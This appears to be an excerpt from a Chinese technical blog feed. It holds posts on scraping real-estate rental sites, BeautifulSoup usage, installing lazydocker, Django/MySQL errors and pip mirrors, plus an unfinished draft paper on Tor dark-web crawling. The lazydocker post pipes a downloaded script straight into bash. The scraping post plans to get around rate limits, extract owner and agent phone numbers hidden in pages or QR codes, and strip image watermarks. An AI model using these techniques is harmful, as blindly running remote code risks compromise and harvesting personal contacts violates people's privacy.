        <content type="html"><![CDATA[<h1 id="对贝壳网、365淘房、房天下的数据采集难易度评估"><a href="#对贝壳网、365淘房、房天下的数据采集难易度评估" class="headerlink" title="对贝壳网、365淘房、房天下的数据采集难易度评估"></a>对贝壳网、365淘房、房天下的数据采集难易度评估</h1><p>利用这三个网址的租房板块进行数据采集难易度评估，租房地址分别为：</p><p>贝壳网 <a href="https://nj.zu.ke.com/zufang/pg%7Bpage%7D">https://nj.zu.ke.com/zufang/pg{page}</a></p><p>365淘房 <a href="http://nj.rent.house365.com/district_rent/p%7Bpage%7D.html">http://nj.rent.house365.com/district_rent/p{page}.html</a></p><p>房天下 <a href="https://nanjing.zu.fang.com/house/i3%7Bpage%7D">https://nanjing.zu.fang.com/house/i3{page}</a></p><p>一、贝壳网 </p><p>尝试对贝壳网租房数据进行采集。</p><p>（1）采集字段：</p><p>名称 价格 位置 大小 朝向 户型 楼层 标签 品牌 维护时间 房源链接 入住 电梯 车位 用水 用电 燃气 采暖 租期 看房 配套设施 联系人 联系方式</p><p>（2）采集标准化数据结果：</p><p>（3）采集过程问题：</p><p>1.没有复杂的反爬措施，但对ip单位时间访问有限制，发包间隔30s可以持续采集。</p><p>2.租房数据只能爬取100页，每页33条。故只能采集到3300条， 若想全部采集，需要细化搜索粒度，例如按地铁线、区域、整租还是合租、租金范围、户型等分割搜索结果，来便利整个搜索结果。这种数据采集方式在淘宝店铺采集中经常用到。</p><p>3.采集过程中暂未采集房源描述及图片，不过都可以实现。对于图片水印问题，在网上查找了相关资料，主要有两种方式：一是开发者标定噪声的特征，在使用噪声周围的颜色特征推理出应该修复的图片的颜色，从而实现水印去除。二是通过美工制作一张纯水印图，然后在图片中匹配水印图并去除。自己有一定的设计基础，熟练使用PS，之前做验证码识别的项目中也接触过opencv，可以尝试去水印。</p><p>二、365淘房 </p><p>租房数据只能爬取50页，每页40条。但365这个限制页面是假的，虽然页面上不再显示50页往后的页码，但是通过url构造仍然能访问到之后的数据。</p><p>预计采集字段包括：</p><p>名称 价格 位置 大小 朝向 户型 楼层 租房方式 附近地铁站 品牌 是否精装修 房源链接 配套设施 联系人 联系方式</p><p>三、房天下</p><p>租房数据只能爬取100页，每页30条。和贝壳网一样不能访问后面隐藏数据，需要细化搜索粒度。</p><p>预计采集字段包括：</p><p>名称 价格 位置 大小 朝向 户型 租房方式 楼层 是否精装修 所属小区 小区地址 房源描述 配套设置 联系人 联系方式</p><p>四、评估</p><p>总的来说，这三个网站采集的难度主要在复杂的数据维度、隐藏数据的采集以及图片水印处理。对于新房、二手房等数据的爬取类似，会有些许出入，但总的来说应该问题不大。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>需求：主要是小区信息、业主经纪人姓名电话 以及 图片水印处理</p><p>365淘房 需要点击js查看联系方式 其实隐藏在界面中 可采集 业主或经纪人电话</p><pre><code>租房：按发布时间排序 个人 http://nj.rent.house365.com/district_rent/f1-n1-p&#123;page&#125;.html中介 http://nj.rent.house365.com/district_rent/f5-n1.html小区 http://nj.sell.house365.com/community/二手房：http://nj.sell.house365.com/district/新房：http://newhouse.nj.house365.com/水印主要有正中间 散布全图 以及右下角论坛有租赁和售卖信息：http://bbs.house365.com/forumdisplay.php?forumid=57 出粗http://bbs.house365.com/forumdisplay.php?forumid=102 二手房</code></pre><p>房天下 扫码拨打电话 经纪人电话隐藏在二维码图片中 可提取；个人房源业主电话需扫码。</p><pre><code>租房https://nanjing.esf.fang.com/新房https://nanjing.newhouse.fang.com/house/s/二手房https://nanjing.esf.fang.com/?ctm=1.nanjing.xf_search.head.143小区https://nanjing.esf.fang.com/housing/</code></pre><p>直营城市<br>    上海、南京、南通、徐州、深圳    </p><p>合作城市<br>    苏州、无锡、常州、镇江、杭州、湖州、嘉兴、盐城、泰州、莆田、中山、湛江    </p><p>重点参考<br>    贝壳找房<br>    安居客<br>    搜房网<br>    房多多<br>    诸葛找房<br>    幸福里<br>    house365<br>    居里找房<br>    58同城<br>    赶集网<br>    房产超市    </p><p>普通参考<br>    吉屋网<br>    Q房网<br>    巧房助手<br>    房产小秘书    找房助手<br>    土地公<br>    第一房产网<br>    销售精灵<br>    软件精灵<br>    推推九九<br>    创图公众号    </p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫解析常用第三方库BeautifulSoup4使用总结</title>
      <link href="2020/06/22/2020-06-22-BeautifulSoup4/"/>
      <url>2020/06/22/2020-06-22-BeautifulSoup4/</url>
      
        <content type="html"><![CDATA[<p>参考自<a href="https://www.jianshu.com/p/1ba25d35ff25">简书：振礼硕晨</a></p><p>总结Beautiful Soup4常用的方法和属性，方便今后查询。</p><p>0.调用BeautifulSoup(param_1,param_2)来生成一个Beautiful Soup对象。这个时候涉及到一个解析器的知识，也就是上述方法的第二个参数。解析器用来帮助我们解析文本结构，目前主要的解析器有以下几种：</p><pre><code>html.parserlxmlxmlhtml5lib</code></pre><p>推荐使用xlml解析器，因为效率高。</p><pre><code>bs = BeautifulSoup(html_str,&#39;lxml&#39;)</code></pre><p>1.find_all() 方法：</p><p>find_all()方法搜索当前tag的所有符合过滤条件的tag子节点。在搜索子节点的时候，我们不仅可以制定要搜索的子节点的标签名，还可以添加过滤条件，更精确的选择我们需要的子节点。实例代码如下：</p><pre><code>不加过滤条件，获取全部的tr标签trs = bs.find_all(&#39;tr&#39;)  限制选择标签的数量，获取符合条件的前两个tr标签trs = bs.find_all(&#39;tr&#39;,limit=2)选择class为even的tr子节点，注意传入的参数是class_，不是classtrs = bs.find_all(&#39;tr&#39;,class_=&quot;even&quot;)选择class=even，且id=feng的tr子节点trs = bs.find_all(&#39;tr&#39;, class_=&quot;even&quot;, id=&quot;feng&quot;)trs = bs.find_all(&#39;tr&#39;, &#123;&quot;class&quot;: &quot;even&quot;, &quot;id&quot;: &quot;feng&quot;&#125;)</code></pre><p>2.find() 方法：</p><p>find()方法和find_all()方法的参数和用法几乎一样，只不过find()方法只选取符合条件的第一个标签。同时，下面三条数据是等价的。</p><pre><code>tr = bs.find(&quot;tr&quot;)tr = bs.find_all(&quot;tr&quot;, limit=1)tr = bs.find_all(&quot;tr&quot;)[0]</code></pre><p>3.get_text()方法：</p><p>如果只想得到tag中包含的文本内容,那么可以使用get_text()方法,这个方法获取到tag中包含的所有文版内容包括子孙tag中的内容,并将结果作为Unicode字符串返回。</p><pre><code>tr = bs.find_all(&quot;tr&quot;)[0]print(tr.get_text())</code></pre><p>结果：</p><pre><code>职位名称职位类别人数地点发布时间</code></pre><p>我们还可以传入一个参数作为分隔符，让获取的字符串更好的显示出来，示例代码如下：</p><pre><code>tr = bs.find_all(&quot;tr&quot;)[0]print(tr.get_text(&quot;----&quot;))</code></pre><p>结果：</p><pre><code>----职位名称--------职位类别--------人数--------地点--------发布时间----</code></pre><p>我们还可以传入参数strip=True删除返回的字符串左右两边的空格，示例代码如下：</p><pre><code>tr = bs.find_all(&quot;tr&quot;)[0]print(tr.get_text(&quot;----&quot;,strip=True))</code></pre><p>结果：</p><pre><code>职位名称----职位类别----人数----地点----发布时间</code></pre><p>4.获取节点属性的方法：</p><p>如果我们想要获取节点的属性，比如对于<a href="www.baidu.com"></a>，我们想获取它的href属性值，即<a href="http://www.baidu.com。或者对于其他的节点元素，我们想要获取name、class、id等属性值的时候，我们可以采用下面的方法：">www.baidu.com。或者对于其他的节点元素，我们想要获取name、class、id等属性值的时候，我们可以采用下面的方法：</a></p><pre><code>trs = bs.find_all(&quot;a&quot;)for tr in trs:    print(tr[&quot;href&quot;])</code></pre><p>5.select()方法：</p><p>通过使用bs库中的select()方法，我们可以使用CSS选择器来选择我们需要的标签。也就是说，我们可以通过标签名，标签的class、标签的id，通过标签的name、href等属性来选择我们的元素。使用该方法返回的是一个迭代器，我们可以通过for…in…循环遍历。示例代码如下：</p><pre><code># 选择所有的p标签p = bs.select(&quot;p&quot;)# 选择class为box的标签box = bs.select(&quot;.box&quot;)# 选择id为text的标签text = bs.select(&quot;#text&quot;)# 选择div中的span标签span = bs.select(&quot;div span&quot;)# 选择div中的直接子元素imgimg = bs.select(&quot;div &gt; img&quot;)# 通过属性来查找标签，比如查找href属性等于index.html的a节点a = bs.select(&quot;a[href=&#39;index.html&#39;]&quot;)</code></pre><p>这只是CSS选择器的一部分，其他的CSS也是很类似的。如果有web前端基础，那么你平时如何设置节点元素的样式，在这里你就按照同样的方法选择节点元素即可。</p><p>6.string属性：</p><p>如果一个节点只包含一个文本节点，或者是只包含一个节点，那么可以使用该属性获取该文本节点的文本内容，或者是这个节点的文本内容。例如：对于</p><pre><code>&lt;div&gt;hahaha&lt;/div&gt;和&lt;div&gt;&lt;p&gt;hahaha&lt;/p&gt;&lt;/div&gt;</code></pre><p>使用返回的结果是一样的，示例代码如下：</p><pre><code>divs = bs.select(&quot;div&quot;)for div in divs:    print(div.string)</code></pre><p>但是如果一个节点下面有很多子孙节点，使用string属性在获取文本的时候，最终返回的是None。这个时候我们应该使用下面的属性。</p><p>7.strings属性：</p><p>如果一个节点下面有很多子孙节点，我们可以使用strings属性来获取其子孙节点的所有文本。该属性最终返回的是一个迭代器，我们可以通过for…in…循环来遍历。实例代码如下：</p><pre><code>tr = bs.select(&quot;tr&quot;)[0]for text in tr.strings:    print(text)</code></pre><p>8.stripped_strings属性：</p><p>在使用上述strings属性获取一个节点中后代文本的时候，可能或出现换行和空格等空白文本，这样在处理的时候会出现麻烦，如果不想获取换行和空格，那么我们可以使用stripped_strings属性。该属性和strings属性一样，返回的也是迭代器，不能直接打印，需要使用for…in…循环来遍历。示例代码如下：</p><pre><code>tr = bs.select(&quot;tr&quot;)[0]for text in tr.stripped_strings:    print(text)</code></pre><p>9.contents属性：</p><p>该属性返回的是某个节点下的全部子元素，包括子元素的标签名和文本内容。返回的数据类型是列表，示例代码如下：</p><pre><code>feng = bs.find(&quot;tr&quot;,id=&quot;test&quot;)print(type(feng.contents))    # 打印出来的是 &lt;class &#39;list&#39;&gt;for text in feng.contents:    print(text)</code></pre><p>10.children属性</p><p>该属性和contents属性的用法是一样的，但是返回的数据类型是迭代器，示例代码如下：</p><pre><code>feng = bs.find(&quot;tr&quot;,id=&quot;test&quot;)print(type(feng.children))      # 打印出来的是 &lt;class &#39;list_iterator&#39;&gt;for text in feng.children:    print(text)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 管理工具 lazydocker</title>
      <link href="2020/06/22/2020-06-22-lazydocker/"/>
      <url>2020/06/22/2020-06-22-lazydocker/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/jesseduffield/lazydocker">传送门</a></p><p>lazydocker，一个简单的 docker 和 docker-compose 终端用户界面，目前有15.3k star。</p><p>支持的系统：Linux, OSX, Windows</p><p>功能特性：</p><pre><code>鼠标、键盘都可操作快速查看 docker/docker-compose 容器环境，一目了然查看 container/service 的日志容器指标可视化自己配置你关注的各项指标图形containers/services 重启、删除、重新构建清理无用镜像、容器、数据卷</code></pre><p>ubuntu安装</p><pre><code>curl https://raw.githubusercontent.com/jesseduffield/lazydocker/master/scripts/install_update_linux.sh | bash</code></pre><p>使用</p><pre><code>lazydocker</code></pre><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/lazydocker.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django出错：mysql两个问题</title>
      <link href="2020/06/20/2020-06-20-Django_mysql_issue/"/>
      <url>2020/06/20/2020-06-20-Django_mysql_issue/</url>
      
        <content type="html"><![CDATA[<h3 id="Django出错：mysql两个问题"><a href="#Django出错：mysql两个问题" class="headerlink" title="Django出错：mysql两个问题"></a>Django出错：mysql两个问题</h3><p>（1）django安装了pymysql还报MySQLdb module: No module named</p><p>在 python2 中，使用 pip install mysql-python 进行安装连接MySQL的库，使用时 import MySQLdb 进行使用</p><p>在 python3 中，改变了连接库，改为了 pymysql 库，使用pip install pymysql 进行安装，直接导入即可使用</p><p>但是在 Django 中， 连接数据库时使用的是 MySQLdb 库，这在与 python3 的合作中就会报以下错误了</p><pre><code>django.core.exceptions.ImproperlyConfigured: Error loading MySQLdb module: No module named &#39;MySQLdb&#39;</code></pre><p>但是我的pymysql已经安装过了,</p><p>解决方法：在项目的 init.py 文件中添加以下代码即可。装pymysql替代mysqlclient（安装Django3后不想折腾mysqlclient那堆库文件）。</p><pre><code>import pymysqlpymysql.install_as_MySQLdb()</code></pre><p>（2）Django3 中遇到django.core.exceptions.ImproperlyConfigured mysqlclient 1.3.13 or newer is required; you have 0.9.3</p><p>在（1）问题基础上，又遇到了（2）问题，原因是Django3对mysqlclient的要求提高了: 1.3.13. 但pymysql的版本没有跟上。</p><p>修改<strong>init</strong>.py，多插入一行代码:</p><pre><code>import pymysqlpymysql.version_info = (1, 3, 13, &quot;final&quot;, 0)pymysql.install_as_MySQLdb()</code></pre><p>实际上pymysql版本号是 0.9.3，却明目张胆篡改version_info欺骗Django。</p><p>保存后启动项目成功。该方案只是个兼容方案，不确定Django3是否依赖mysqlclient的新特性，因此生产环境还是建议部署mysqlclient，而非pymysql。</p><h3 id="mysqlclient与pymysql区别是什么？"><a href="#mysqlclient与pymysql区别是什么？" class="headerlink" title="mysqlclient与pymysql区别是什么？"></a>mysqlclient与pymysql区别是什么？</h3><pre><code>mysqlclient是mysql官方提供的Python SDK，安装时依赖mysql-dev与python-dev相关的库函数完成当前系统平台的编译，因为使用大量C库，性能会比pymysql优秀得多。SDK更新和维护也有官方保障。pymysql是第三方在MySQL通信协议上实现的SDK，所有与数据库的交互都是通过MySQL独有的通信协议完成，性能上会比mysqlclient有劣势。且版本更新可能滞后，且维护不一定到位。但好处就是pip install安装很容易，不像mysqlclient先要把编译依赖的C库装好，在一些建档任务和开发环境快速搭建上有优势。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RuntimeError: cryptography is required for sha256_password or caching_sha2_password</title>
      <link href="2020/06/20/2020-06-20-mysql_sha256_password/"/>
      <url>2020/06/20/2020-06-20-mysql_sha256_password/</url>
      
        <content type="html"><![CDATA[<p>python项目连接数据库出现</p><pre><code>RuntimeError: cryptography is required for sha256_password or caching_sha2_password</code></pre><p>原因</p><pre><code>由于Mysql 8.0 的部分语法，密码的加密方式发生了改变，在8.0 中的用户密码采用的是sha2加密方法。</code></pre><p>解决办法：</p><pre><code>安装cryptographypip install cryptography</code></pre>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django出错：&#39;staticfiles&#39; is not a registered tag library</title>
      <link href="2020/06/20/2020-06-20-Django_staticfiles_is_not_a_registered_tag_library/"/>
      <url>2020/06/20/2020-06-20-Django_staticfiles_is_not_a_registered_tag_library/</url>
      
        <content type="html"><![CDATA[<p>Django出错：’staticfiles’ is not a registered tag library </p>{% load staticfiles %} {% load adminstatic %} 是在 Django 2.1的方法, 在 Django 3.0已经修改了    {% load staticfiles %}    {% load static from staticfiles %}    {% load adminstatic %}需要修改成    {% load static %}]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip 指定源安装</title>
      <link href="2020/06/20/2020-06-20-pip_assigin_src_download/"/>
      <url>2020/06/20/2020-06-20-pip_assigin_src_download/</url>
      
        <content type="html"><![CDATA[<p>指定源 参数 -i </p><p>阿里源</p><p>pip install -r requirements.txt -i <a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p><p>豆瓣</p><p>pip install -r requirements.txt -i <a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a></p><p>清华大学</p><p>pip install -r requirements.txt -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a></p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Tor的暗网空间资源探测</title>
      <link href="2020/06/18/2020-06-18-tor_paper/"/>
      <url>2020/06/18/2020-06-18-tor_paper/</url>
      
        <content type="html"><![CDATA[<p>基于Tor的暗网空间资源探测</p><p><a href="https://www.doc88.com/p-7874959544484.html">https://www.doc88.com/p-7874959544484.html</a></p><p>基于Scrapy的深层网络爬虫研究</p><p><a href="https://www.doc88.com/p-9731740497978.html">https://www.doc88.com/p-9731740497978.html</a></p><p>匿名网站信息爬取技术研究</p><p><a href="https://www.doc88.com/p-3314866498816.html">https://www.doc88.com/p-3314866498816.html</a></p><p>toripchanger</p><p><a href="https://gist.github.com/DusanMadar/8d11026b7ce0bce6a67f7dd87b999f6b">https://gist.github.com/DusanMadar/8d11026b7ce0bce6a67f7dd87b999f6b</a></p><p> 在TOR网络上爬行的黑暗网站</p><p><a href="https://ache.readthedocs.io/en/latest/tutorial-crawling-tor.html">https://ache.readthedocs.io/en/latest/tutorial-crawling-tor.html</a></p><p>由于工作需求，最近要写一篇论文。毕业近三年，这期间没有写过一篇论文，不知从何处下手，于是将自己毕业以来的工作总结一下，看看能不能找到思路。</p><p>分到暗网课题，对自己是一个挑战。因为，这是一个0的项目。</p><p>为什么说是0呢？因为，人手几乎是0；代码量为0；对于该课题做什么完全没有头绪。</p><p>所以只能一点点的摸索，摸索的过程，就是从搭建暗网环境开始。</p><h2 id="基于crawlab的分布式暗网空间资源探测和采集系统"><a href="#基于crawlab的分布式暗网空间资源探测和采集系统" class="headerlink" title="基于crawlab的分布式暗网空间资源探测和采集系统"></a>基于crawlab的分布式暗网空间资源探测和采集系统</h2><p>摘要：随着互联网技术的飞速发展，暗网及匿名技术扮演着越来越重要的角色，并对网络安全造成巨大的挑战。因此，夺取制网权，对暗网空间进行探测和采集，具有重要的研究意义和应用价值。本文简要介绍目前使用者最多的暗网协议Tor,描述暗网资源探测五级链路搭建过程，并利用python的scrapy爬虫框架，设计了基于crawlab的分布式暗网空间资源探测和采集系统，能够从明暗网进行Tor域名采集、对暗网空间存活程度进行探测、对重要数据源进行聚焦采集，并分别实现了桌面应用和web服务及时有效地展示数据。该系统极大地提升了对暗网空间的掌控能力，对夺取暗网空间主动权具有重大意义。</p><p>关键词：暗网 资源探测和采集</p><p>0 引言</p><p>明网(Surface Web)，又称表层网，是指能被普通搜索引擎(比如 Google、百度、搜狗)检索到的网络，约占整个互联网的 4%。与明网相对的，被称为深网(Deep Web)，是指内容不能被普通搜索引擎检索到的网络，约占整个互联网的 96%。深网里面的内容，需要账号密码、访问权限等才可以访问，比如邮箱里的内容、存储在云服务里面的内容、公司的数据库、学术论文数据库等等，都属于深网的范畴。在深网这个大范畴下，还有一部分网络被称为暗网(Dark Web)，需要通过特定的浏览器、特殊授权或者特殊设置才连接上的网络，普通的浏览器和搜索引擎无法进入。</p><p>随着互联网技术的飞速发展，暗网极强的匿名性和保密性的特点为网络安全带来了诸多隐患。暗网网站的使用者、访问者不可被追踪，使得大量用户在其中交易泄漏数据、毒品、武器，暗网逐渐成为网络空间中最为隐蔽和黑暗的部分。因此为了获取制网权，进行暗网空间的探测和采集，对了解掌握暗网、保障网络安全具有重要的现实意义。</p><p>1 研究现状</p><p>暗网中充斥着各类隐私数据、用户凭证泄漏，并且有大量漏洞利用工具等交易信息，对网络安全价值巨大，但暗网地址难以采集、生存率低、信息真伪难以确定、可用性差等特点，导致收集信息的难度巨大。目前，探测暗网空间已经成为国内外与之相关领域专家学者们关注和研究的热点问题。</p><p>杨溢等人设计了一套Tor域名地址采集系统，分别从明暗网上获取Tor网络资源；于浩佳给出了一种通过将Scrapy接入Polipo服务器，和Tor浏览器结合进入Tor网络，实现Tor匿名网站网页爬取的方法；刘宇和郑成焕通过分析深层网络特点制定了和是的Scrapy爬虫策略，给常见的深层网数据提取模式提供了具体的解决方案和策略；何思雨等人利用TF-IDF特征权重计算和机器学习分类算法，实现了对隐藏服务非法网页的有效分类。李思航等人提出了TDRS Tor路由选择算法，有效的排除链路的恶意节点，提升了Tor的匿名安全性。</p><p>现有暗网相关研究一般是优化访问Tor速率，对Tor域名地址进行采集，少部分对包含v3地址的暗网空间进行探测和采集以及对重要数据的聚焦采集。本研究针对Tor协议，作出以下贡献：<br>（1）搭建链路，在linux/Windows下都完成了Tor HSv3版本地址的稳定访问。<br>（2）多种渠道多种方式采集Tor洋葱种子地址，包括v2及v3地址。<br>（3）有选择性的对暗网中重要站点进行聚焦采集，获得结构化数据。<br>（4）利用Crawlab实现分布式暗网空间探测和采集。<br>（5）桌面应用和web服务对探测采集结果进行可视化展示和分析。</p><p>2.Tor匿名网络链路搭建<br>2.1 Tor匿名通信系统</p><p>Tor是由美国海军研究实验室开发出来的匿名通信系统。2002年9月20日，在海军研究室赞助下，科学家罗杰（Roger Dingledine）和尼克（Nick Mathewson）发布了Tor的第一个正式版本。2004年，海军研究室开源了Tor代码，美国电子前沿基金会（EFF）继续赞助罗杰和尼克。罗杰、尼克和另外5名成员，在2006年12月共同成立了一个非营利组织Tor Project，核心工作就是维护Tor网络。Tor不仅可以浏览暗网，还可以匿名浏览常规网站，这一点也成为大量注重身份隐私用户的普遍选择。</p><p>Tor网络由众多网络节点组成，这些网络节点被称为洋葱路由器(OR)，主要由用户Tor客户端以志愿者身份在Tor网络中担任，作为中继节点转发数据。Tor代理会在全部的网络节点中随机选择三个作为转发节点，并建立起完整的通信链路。在通信传输数据时，数据包在转发前会被中继节点以通信链路的反向顺序逐层加密三层，开始通信后，经过每个节点时就会被该节点解密，获得下一个中继节点的IP地址，继续向前传输，到达最后一跳时，数据以明文形式传输至用户。</p><p>2.2 Tor技术原理<br>2.2.1 Tor网络组成<br>Tor网络除了用户连接Tor使用的Tor客户端，还有两种主要的服务器角色，分别是中继服务器和目录服务器。中继服务器负责中转数据包的路由器，可以理解为代理，其中用户Tor客户端也可以将自身作为中继服务器；目录服务器分为两种，一种是中继节点目录服务器，专门保存Tor网络中所有中继服务器列表相关信息，主要是中继服务器地址、公钥、带宽等；另一种是隐匿服务目录服务器，专门用来存储Tor隐匿服务描述符，当用户需要访问匿名服务时，用户的洋葱路由就会到此种目录服务其中查询相关信息。当用户有匿名需求时，Tor客户端先与目录服务器通信获得全球活跃中继节点信息，然后再随机选择三个节点组成通信链路，用户流量跳跃这三个节点之后最终到达目标网站服务器。Tor客户端与目标服务器的通信分为两个部分：建立通信链路、数据包传输。<br>2.2.2 建立通信链路</p><ol><li>客户端与目录服务器建立链接，并从目录服务器中选取一个时延最低的服务器作为第一个中继服务器OR1；</li><li>客户端向OR1发送一个请求建链请求，OR1验证完客户端的合法性后生成一对密钥（公钥pubkey_OR1_Client、私钥prikey_OR1_Client）,然后将公钥pubkey_OR1_Client发回给客户端。至此，客户端成功的建立了其与OR1的通信链路；</li><li>客户端又从目录服务器中选择一个时延最低的中继服务器OR2，并向OR1发送一个数据包：使用pubkey_OR1_Client加密OR2的地址；</li><li>OR1收到数据包后使用prikey_OR1_Client解开数据包，发现是一个让其自身与另外一个服务器OR2建立链接的请求，那么OR1重复步骤2与OR2建立链接，并将OR2返回的OR1与OR2链路的公钥pubkey_OR1_OR2返回给客户端；</li><li>客户端重复步骤3、4，建立OR2与OR3之间的通信链路，并接收到OR2与OR3之间链路的公钥pubkey_OR2_OR3；</li><li>至此，客户端与3个中继服务器之间的链路已经成功建立，客户端拥有3把公钥：pubkey_Client_OR1、pubkey_OR1_OR2、pubkey_OR2_OR3。</li></ol><p>2.3 HSv2 VS HSv3<br>v2地址和v3地址对比</p><p>2.2.3 数据包传输</p><ol><li>客户端将要发送的数据（data）经过3层加密包裹：<br>第一层：使用pubkey_OR2_OR3加密data：pubkey_OR2_OR3(data)；<br>第二层：使用pubkey_OR1_OR2加密第一层加密后的数据：pubkey_OR1_OR2(pubkey_OR2_OR3(data))；<br>第三层：使用pubkey_Client_OR1加密第二层机密后的数据：pubkey_Client_OR1(pubkey_OR1_OR2(pubkey_OR2_OR3(data)))；</li><li>OR1收到客户端发来的数据后使用其与Client链路的私钥prikey_Client_OR1解开数据包，发现数据包是发往OR2的，那么OR1就将解开后的数据包发送给OR2；</li><li>OR2收到OR1发来的数据包重复OR1的步骤：将接收的数据包解开发往OR3；</li><li>OR3收到数据包后，使用prikey_OR2_OR3解开数据包，这个时候的数据包是客户端要发往目的服务器的真实数据包data。此时，OR3就将data路由给目标服务器。</li></ol><p>数据包层层包裹，每经过一个中继服务器就解开一层，它的结构就跟洋葱相同，你只能看出它的外表，而想要看到核心，就必须把它层层的剥开，这就它叫洋葱路由的缘由。Tor匿名的原理也正是基于此：真实数据包在层层包裹之后在链路上发送，Tor链路上的节点不知道数据包的源头，而只知道通信链路中与自己相邻的前一跳和后一跳节点信息，这样就无法追踪到发送者IP地址，因此在Tor网络中建立了一条完整的安全信道，服务的匿名性可以得到保证。</p><p>2.3 Tor链路搭建<br>目前，Tor Project官网提供的方式是利用Tor Browser浏览器进行连接，并且已经于。但Tor Browser只是集成了Tor内核的firefox，使用需要依赖firefox界面，极大的占用内存。因此我们利用了Tor Browser集成的Tor内核，完成了windows系统对Tor的连接，并且可以结合Vidalia控制面板对tor进行控制；并利用编译Tor源码的方式，完成了linux系统对Tor的连接。</p><p>2017年9月，Tor Project更新增加HSv3服务，Onion v3是新的下一代Tor Onion Services规范。最明显的变化是地址长度的增加，但是Onion v3使用更好的加密，ECC（椭圆曲线加密）而不是RSA，并且具有改进的隐藏服务目录协议。<br>2.2.1 windows中搭建Tor链路<br>在windows系统中，利用Tor Browser集成的Tor内核连接暗网。Tor内核在Tor Browser目录的Tor目录下，利用Tor内核程序指定写好的配置文件即可访问。同时也可以利用Vidalia控制Tor的连接，Vidalia是使用Qt构建的用于控制Tor的GUI界面。它允许用户启动、停止或查看Tor的状态，查看、过滤或搜索日志消息，监视带宽使用情况以及配置Tor的某些方面。还可以帮助用户可选地设置Tor中继服务器。在Vidalia中设置好Tor内核位置并指定配置文件也可以完成Tor的连接。<br>2.2.2 linux中搭建Tor链路<br>在linux系统中，通过对Tor源码进行编译并配置连接暗网。使用的linux系统是ubuntu 18.04，tor版本为0.4.2.7。在Tor官网上下载最新Tor源码，并安装所需库libevent-dev、libssl-dev、zlib1g-dev，编译完成后启动Tor服务并指定配置文件即可。</p><p>以上配置均完成了系统对Tor的连接，即默认对Socks5://127.0.0.1:9050端口的连接。若要在其他应用程序中使用Tor代理，还需要接入polipo、privoxy等HTTP代理。在暗网空间探测和采集过程中，我们使用了如下的五级链路：</p><p>图</p><p>目前，网络上公开的Onion地址链接较少，Tor匿名服务生命周期短、地址迁移快以及网络开放时间不稳定，并且随着欧洲刑警组织和美国执法机构的协调联合努力，很多匿名服务被查封，暗网空间因此受到了极大地限制。而且，对于暗网空间聚焦采集的数据也相当有限。故利用上图五级链路连接Tor暗网，对暗网空间整体进行探测，并通过多种方式尽可能多地发现更多Tor Onion隐藏服务，对其中重要的有价值的服务进行聚焦采集。</p><p>3 暗网空间探测<br>暗网空间探测我们主要分为获取Tor Onion地址、暗网空间整体存活率以及获取已有域名列表中地址信息（包括截图、缓存等）。<br>3.1 获取Tor Onion地址<br>前期，我们主要是对Tor HSv2地址链接进行了探测，但随着Tor Project的更新维护，大量HSv3地址涌现，增加了对V3地址的探测。我们通过三种方式获取Onion地址，分别是从论坛、社交媒体相关板块获取、从某些Onion域名列表获取、通过已有域名列表匹配新的地址。<br>(1)论坛、社交媒体<br>reddit tor/onion板块、Twitter相关人物不定时更新onion地址<br>(2)Onion域名列表<br>wiki、darkfail<br>(3)通过已有域名列表匹配<br>正则表达式<br>(https?://([a-z0-9_-]{1,64}.){0,4}[a-z0-9_-]{1,56}.onion)</p><p>3.2 暗网空间整体存活率探测<br>多线程，线程控制</p><p>3.3 获取已有域名列表地址信息<br>selenium截图</p><p>4 暗网空间采集<br>Tor数据聚焦采集系统<br>4.1 技术类站点：分享技术/出售黑客技术/售卖0day/漏洞利用<br>4.2 新闻类站点<br>4.3 售卖类站点：其中包括交易市场,自营商店,第三方托管平台(网站担保);交易品种大多是信用卡、枪支、毒品、护照、电子产品、伪钞、解密服务、杀手服务、比特币洗钱服务等;大多数网站使用比特币进行交易。我们重点关注网络安全方面的商品。<br>4.4 搜索引擎类：</p><p>5 